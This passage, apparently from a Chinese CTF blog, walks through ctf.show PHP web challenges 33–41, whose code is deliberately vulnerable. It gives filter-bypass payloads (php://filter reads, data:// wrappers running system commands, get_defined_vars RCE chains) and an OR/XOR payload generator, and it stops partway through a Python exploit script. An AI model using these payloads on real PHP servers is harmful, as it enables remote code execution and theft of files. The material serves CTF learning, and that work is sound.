class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åŒ32ä¸€æ ·ï¼Œ<code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œç”¨require()å‡½æ•°</p><p><code>?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>åŒç†32     <code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åŒç†32     <code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠ0-9è¿‡æ»¤æ‰äº†ï¼Œè‚¯å®šä¸èƒ½å†ç”¨1è¿›è¡Œä¼ å‚ï¼Œæˆ‘ä»¬å¯ä»¥æ¢æˆå­—æ¯è¿›è¡Œï¼Œæ¢æˆx    </p><p>   <code>?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;       <span class="comment">//æ–‡ä»¶åŒ…å«è·å–åˆ°çš„å˜é‡cçš„å€¼ï¼Œä½†æ˜¯å¯¹å˜é‡cåˆæœ‰è¿‡æ»¤ï¼Œè¦æ±‚è·å–åˆ°çš„cä¸­ä¸åŒ…å«flag</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);   <span class="comment">//è¿™ä¸ªå‡½æ•°åªèƒ½åŒ…å«æ•°æ®ï¼Œä½†æ˜¯ä¸èƒ½è¿›è¡Œä»£ç æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨dataä¼ªåè®®ï¼Œå¯ä»¥è®©dataåè®®åçš„æ•°æ®è¿›è¡Œä»£ç æ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220809222608741.png" alt="" style="zoom: 50%;" /><p><code>?c=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code>      ç”¨dataä¼ªåè®®å¯ä»¥æŸ¥çœ‹åˆ°å½“å‰ç›®å½•ï¼Œé‚£å°±è¿›è¡Œè¯»å–flagï¼Œå› ä¸ºè¿‡æ»¤æ‰äº†flagï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æ˜Ÿå·ä»£æ›¿fä»¥åçš„å­—ç¬¦ï¼Œå› ä¸ºç›®å½•ä¸‹é¢åªæœ‰få¼€å¤´çš„è¿™ä¸€ä¸ªæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220809223516473.png"></p><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;    <span class="comment">//å¤šè¿‡æ»¤äº†PHPï¼Œfile </span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ payloadçš„æ—¶å€™ï¼Œè¦ç»•è¿‡flag   PHPå’Œfile   <code>?c=data://text/plain,&lt;?= system(&quot;tac fla*&quot;);?&gt;</code>     ç”¨çŸ­æ ‡ç­¾&#x3D;ä»£æ›¿PHP</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220814134053418.png" alt="" style="zoom:50%;" /><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 06:13:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;ã€€ã€€ï¼ï¼è¿‡æ»¤äº†flagã€€ã€€ã€€</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);ã€€ã€€ã€€</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=data://text/plain,&lt;?php system(&quot;tac fla*&quot;);?&gt;</code></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220815103627785.png" style="zoom: 67%;" /><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 06:03:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;ã€€ã€€ï¼ï¼æ²¡æœ‰è¿‡æ»¤å­—æ¯ï¼Œè‹±æ–‡æ‹¬å·å’Œåˆ†å·</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»å˜é‡é‡Œé¢å‘ç°ã€€ã€€ã€€<code>?c=print_r(get_defined_vars());</code>ã€€ã€€è¿™ä¸€æ­¥æ˜¯æ‹¿åˆ°å½“å‰ç›®å½•çš„æ‰€æœ‰å˜é‡</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220815105146804.png"></p><blockquote><p>[_POST] &#x3D;&gt; Array ( )</p></blockquote><p>å‘ç°postæ•°ç»„ï¼Œè‚¯å®šè¦å¾—åˆ°poståŒ…å«çš„å­—ç¬¦ä¸²ï¼Œåœ¨postæ ä¼ å…¥<code>1=phpinfo();</code></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816121132495.png" style="zoom:80%;" /><p>æœç„¶å¯ä»¥ä¼ å…¥ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥åœ¨phpinfo();è¿™ä¸ªä½ç½®è¿›è¡Œrce(è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰äº†</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816121621174.png" style="zoom:67%;" /><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°è¿™ä¸ªæ•°ç»„ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦æ‹¿åˆ°phpinfo()è¿™ä¸ªæ•°ç»„å€¼</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816122013973.png" style="zoom:67%;" /><p>   <code>?c=print(array_pop(next(get_defined_vars())));</code>     array_pop()å‡½æ•°ï¼Œå¼¹å‡º</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816122319135.png" style="zoom:80%;" /><p>åŠ ä¸ªeval()å‡½æ•°ï¼Œé›†åˆæ‰§è¡Œ</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816122609022.png" style="zoom: 80%;" /><p>è¿™ä¸€æ­¥å°±æ˜¯rceäº†ï¼Œä¼ å…¥ä»£ç æ‰§è¡Œå‘½ä»¤ï¼Œè·å–flag.phpæ–‡ä»¶</p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: ç¾½</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:31:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:40:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: 1341963450<span class="doctag">@qq</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctf.show</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„é™„ä¸€ä¸ªå¼‚æˆ–expè„šæœ¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Y4tacker</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-21 20:31:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//æˆ–</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">orRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼‚æˆ–</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xorRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–å</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negateRce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mode=1ä»£è¡¨æˆ–ï¼Œ2ä»£è¡¨å¼‚æˆ–ï¼Œ3ä»£è¡¨å–å</span></span><br><span class="line"><span class="comment">//å–åçš„è¯ï¼Œå°±æ²¡å¿…è¦ç”Ÿæˆå­—ç¬¦å»è·‘äº†ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œç›´æ¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="variable">$mode</span>, <span class="variable">$preg</span>=<span class="string">&#x27;/[0-9]/i&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span>!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$par1</span> = <span class="string">&quot;%&quot;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                    <span class="variable">$par2</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">orRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">2</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">xorRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$res</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">negateRce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">generate</span>(<span class="number">1</span>,<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>);</span><br><span class="line"><span class="comment">//1ä»£è¡¨æ¨¡å¼ï¼Œåé¢çš„æ˜¯è¿‡æ»¤è§„åˆ™</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘å®Œè¿™ä¸ªè„šæœ¬ä¼šå¾—åˆ°ä¸€ä¸ªrce.txt</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php D:\\phpstudy_pro\\WWW\\rce_fuzz.php&quot;</span>)  <span class="comment"># æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(argv) != <span class="number">2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;USERï¼špython exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;egï¼š  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">f = <span class="built_in">open</span>(<span 